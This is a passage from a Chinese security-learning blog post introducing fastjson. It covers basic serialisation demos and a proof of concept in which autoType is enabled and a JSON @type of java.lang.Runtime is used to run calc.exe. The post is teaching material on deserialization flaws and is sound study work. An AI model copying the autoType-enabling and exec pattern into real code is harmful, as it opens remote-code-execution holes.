<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="记录对java安全的初次探索">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson入门学习">
<meta property="og:url" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html">
<meta property="og:site_name" content="rev1ve&#39;s blog">
<meta property="og:description" content="记录对java安全的初次探索">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320225857395.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320230127970.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231233090.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231946636.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323224255702.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323231657962.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324220432233.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240324220536033.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324223414057.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324225014432.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324231104393.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125553114.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125730090.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205721063.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205743267.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205812496.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205823806.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205839574.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326131933212.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225435561.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225528275.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225830172.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225928936.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230020115.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230119890.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230459323.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230642420.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233254635.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233412606.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326235721296.png">
<meta property="og:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240327000034710.png">
<meta property="article:published_time" content="2024-03-27T16:00:00.000Z">
<meta property="article:modified_time" content="2024-03-30T14:13:26.938Z">
<meta property="article:author" content="rev1ve">
<meta property="article:tag" content="java安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320225857395.png">

<link rel="canonical" href="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>fastjson入门学习 | rev1ve's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">rev1ve's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="rev1ve">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rev1ve's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          fastjson入门学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-28 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-28T00:00:00+08:00">2024-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-30 22:13:26" itemprop="dateModified" datetime="2024-03-30T22:13:26+08:00">2024-03-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          
            <span id="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html" class="post-meta-item leancloud_visitors" data-flag-title="fastjson入门学习" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>记录对java安全的初次探索</p>
<span id="more"></span>

<h1 id="fastjson入门学习"><a href="#fastjson入门学习" class="headerlink" title="fastjson入门学习"></a>fastjson入门学习</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13386?time__1311=mqmxnDBG0QQeqGNDQi5BKvC7Dc7oF3d4D&alichlgref=https://xz.aliyun.com/u/56767">参考文章</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>简介</strong></p>
<blockquote>
<p>Fastjson是一个Java语言编写的高性能JSON解析库，它提供了强大的JSON处理能力，能够在Java对象和JSON之间进行快速、灵活的相互转换。</p>
</blockquote>
<h3 id="fastjson如何用"><a href="#fastjson如何用" class="headerlink" title="fastjson如何用"></a>fastjson如何用</h3><p>在IDEA创建一个maven项目，打开pox.xml在末尾添加如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2.50&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320225857395.png"></p>
<p>添加完记得点击右侧的maven重新加载</p>
<p>然后就可以编写简单的demo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line"></span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码很好的展示了Fastjson应用的方便之处，可以将Java对象和JSON之间快速转换，执行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320230127970.png"></p>
<p>此外我们可以注意到下面这行代码的表述吗，用的是<code>Person.class</code>来直接进行映射，这是由于<code>Java</code>类的属性名和<code>JSON</code>字段名是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br></pre></td></tr></table></figure>

<p>如果不相同的话，可以使用<code>@JSONField</code>注解来指定<code>Java</code>类的属性和<code>JSON</code>字段之间的映射关系</p>
<p>demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;user_age\&quot;:20,\&quot;user_name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        @JSONField(name = &quot;user_name&quot;)</span><br><span class="line">        private String name;</span><br><span class="line">        @JSONField(name = &quot;user_age&quot;)</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下，会发现也能成功在<code>Java</code>类的属性和<code>JSON</code>字段之间进行转换</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231233090.png"></p>
<p>我们注意到明明实例化的是<code>Person person = new Person(&quot;Alice&quot;, 18);</code>为什么属性顺序是反过来的，原因是在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成<code>JSON</code>字符串，可以通过在类中使用<code>@JSONType</code>注解来设置属性的序列化顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    @JSONType (orders = &#123;&quot;name&quot;,&quot;age&quot;&#125;)</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们通过<code>@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</code>来指定属性的序列化顺序，这样就是<code>name</code>在前，<code>age</code>在后了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231946636.png"></p>
<p>了解一些基本的注解后我们来看看<code>@type</code></p>
<blockquote>
<p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。</p>
</blockquote>
<p>测试代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String json=&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br><span class="line">        Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们详细分析下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br></pre></td></tr></table></figure>

<p>我们导入Java标准库中的IOException异常类，因为如果发生了I&#x2F;O错误（如本demo的弹calc），又或者无法执行命令或读取命令输出时，会抛出<code>IOException</code>。</p>
<p>我们先定义json其中<code>@type</code>属性的值为<code>java.lang.Runtime</code>，然后执行下面语句指定在JSON解析过程中，允许反序列化指定的类或包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br></pre></td></tr></table></figure>

<p>接着使用<code>parseObject</code>方法，将JSON字符串解析为Java对象</p>
<p>（由于<code>fastjson</code>在<code>1.2.24</code>之后默认禁用<code>AutoType</code>，因此这里我们通过下面命令来开启，否则会报错<code>autoType is not support</code>。）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br></pre></td></tr></table></figure>

<p>然后成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323224255702.png"></p>
<p>我们继续看下面demo，先创建Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+&quot;name=&quot;+name+&quot;, age=&quot;+age+&#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getAge()&#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setAge(int age)&#123;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再看向main.java</p>
